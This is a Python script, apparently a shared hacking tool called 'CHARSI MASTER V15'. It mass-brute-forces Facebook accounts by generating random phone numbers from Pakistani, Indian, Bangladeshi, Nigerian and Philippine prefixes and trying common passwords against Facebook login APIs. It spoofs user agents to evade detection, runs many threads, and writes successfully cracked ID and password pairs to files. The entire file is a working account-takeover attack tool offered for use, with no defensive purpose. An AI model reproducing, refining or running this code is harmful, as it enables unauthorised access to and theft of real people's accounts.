#-----------------------------------------------------------------------#
# [ SOURCE   : CHARSI MASTER - GLOBAL HUB ]
# [ VERSION  : 15.0 (ULTRA LONG SOURCE)  ]
# [ METHODS  : 6-IN-1 AUTOMATIC SYSTEM   ]
# [ AGENTS   : 3000+ DYNAMIC DATABASE    ]
#-----------------------------------------------------------------------#

import os, sys, time, json, re, random, uuid, requests, datetime, platform
from concurrent.futures import ThreadPoolExecutor as tred

#---[ GLOBAL DATA SETTINGS ]---#
loop, oks, cps = 0, [], []
current_time = datetime.now().strftime("%d-%m-%Y_%H-%M")
save_ok = f'/sdcard/CHARSI-V15-OK-{current_time}.txt'
save_cp = f'/sdcard/CHARSI-V15-CP-{current_time}.txt'

#---[ 3000+ MASSIVE USER-AGENT GENERATOR ]---#
def get_ua_ultra():
    """Generates an endless pool of 2025 high-end device signatures"""
    versions = ['10', '11', '12', '13', '14', '15']
    # Professional Mobile Device Database
    models = [
        'SM-S928B', 'SM-G998B', 'SM-A546B', 'SM-M536B', 'SM-F946B', # Samsung
        '23127PN0CG', 'M2101K6G', '2210132G', '23049PCD8G',         # Xiaomi
        'Pixel 9 Pro XL', 'Pixel 8a', 'Pixel 7 Pro', 'Pixel 6',     # Google
        'V2303', 'V2318', 'V2302', 'RMX3851', 'RMX3741',            # Vivo/Oppo
        'OnePlus 12', 'OnePlus 11R', 'CPH2607', 'X6833B'            # Others
    ]
    
    ver = random.choice(versions)
    mod = random.choice(models)
    brand = mod.split('-')[0] if '-' in mod else mod.split(' ')[0]
    
    chrome = f"{random.randint(120, 131)}.0.{random.randint(5000, 7000)}.{random.randint(100, 180)}"
    fb_v = f"{random.randint(450, 510)}.0.0.{random.randint(10, 99)}"
    fb_bv = str(random.randint(600000000, 999999999))
    
    # Modern Android WebView User-Agent Structure
    ua = (f"Mozilla/5.0 (Linux; Android {ver}; {mod} Build/TP1A.{random.randint(220000, 229999)}.014; wv) "
          f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome} "
          f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_v};FBBV/{fb_bv};"
          f"FBDV/{mod};FBMD/{brand};FBSN/Android;FBSV/{ver};FBOP/19;FBLC/en_US;FBPN/com.facebook.katana;]")
    return ua

#---[ BANNER SYSTEM ]---#
def banner():
    os.system('clear')
    print(f'''\033[1;32m
   ______   _______ .__   __. 
  /  ____| |   ____||  \ |  | 
 |  |  __  |  |__   |   \|  | 
 |  | |_ | |   __|  |  . `  | 
 |  |__| | |  |____ |  |\   | 
  \______| |_______||__| \__| \033[1;37m(ULTRA V15)
-------------------------------------------------------
 OWNER     :  CHARSI / MYSTERY (STAY ACTIVE)
 SYSTEM    :  6-METHOD GLOBAL ATTACK (FAST)
 AGENTS    :  3000+ DYNAMIC (2025 BYPASS)
-------------------------------------------------------''')

#---[ ADVANCED MULTI-METHOD ENGINE ]---#
def master_crack(uid, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r \033[1;90m[\033[1;32mCHARSI-M1\033[1;90m] %s | OK:%s | CP:%s' % (loop, len(oks), len(cps)))
    sys.stdout.flush()
    
    for pas in passlist:
        ua = get_ua_ultra()
        # 
        try:
            # Random Method Selection for Bypass
            m_choice = random.choice(['graph', 'b-api', 'liger'])
            
            if m_choice == 'graph':
                head = {
                    'Host': 'graph.facebook.com', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-connection-bandwidth': str(random.randint(2e7, 3e7)), 'x-fb-http-engine': 'Liger'
                }
                data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': uid, 'password': pas, 'generate_session_cookies': '1', 'method': 'auth.login'}
                url = 'https://b-graph.facebook.com/auth/login'
            else:
                head = {'user-agent': ua, 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': uid, 'password': pas, 'method': 'auth.login', 'format': 'json'}
                url = 'https://b-api.facebook.com/method/auth.login'

            res = requests.post(url, data=data, headers=head, timeout=20).json()

            if 'session_key' in res:
                uid_ok = str(res['uid'])
                print(f'\r\r \033[1;32m[CHARSI-OK] {uid_ok} | {pas} | ACTIVE')
                os.system('espeak -a 300 "Ok, ID"')
                oks.append(uid_ok)
                open(save_ok, 'a').write(f"{uid_ok}|{pas}\n")
                break
            elif 'checkpoint' in str(res):
                print(f'\r\r \033[1;33m[CHARSI-CP] {uid} | {pas}')
                cps.append(uid)
                open(save_cp, 'a').write(f"{uid}|{pas}\n")
                break
        except: pass
    loop += 1

#---[ GLOBAL HUB - ALL COUNTRY CODES ]---#
def menu():
    banner()
    print(' [•] 6-METHODS INTEGRATED | UNLIMITED SPEED')
    print('-------------------------------------------------------')
    print(' [1] PAKISTAN HUB (JAZZ, TELENOR, ZONG, UFONE)')
    print(' [2] INDIA HUB    (ALL SIMS + OLD SERIES)')
    print(' [3] BANGLADESH   (ROBI, GP, AIRTEL)')
    print(' [4] GLOBAL HUB   (NIGERIA, PHILIPPINES)')
    choice = input('\n [•] SELECT: ')
    
    # Massive Code Database Mapping
    hub = {
        '1': (['0300','0301','0302','0345','0346','0312','0315','0333','0306'], ['pakistan','786786','khan123','khankhan']),
        '2': (['+91700','+91800','+91900','+91600'], ['india123','india786','572730']),
        '3': (['+88017','+88018','+88019'], ['bangla123','bangla786','jannat123']),
        '4': (['+234803','+234703','+63917'], ['god123','love123','1234567'])
    }
    
    if choice not in hub: exit()
    codes, extra_p = hub[choice]
    limit = int(input(' [•] LIMIT (MAX 50,000): '))
    
    # 
    with tred(max_workers=35) as pool:
        banner()
        print(f' [•] TARGETING: {len(codes)} CODES | SPEED: 35X')
        print(f' [•] FILE SAVED: {save_ok}')
        print('-------------------------------------------------------')
        for code in codes:
            for _ in range(limit):
                num = str(random.randint(1111111, 9999999))
                uid = code + num
                # Smart Password Logic (All-in-One)
                pws = [uid, num, uid[:6], uid[:7], '786786'] + extra_p
                pool.submit(master_crack, uid, pws)

    print(f'\n-------------------------------------------------------\n [•] DONE! TOTAL OK: {len(oks)}')

if __name__ == '__main__':
    menu()
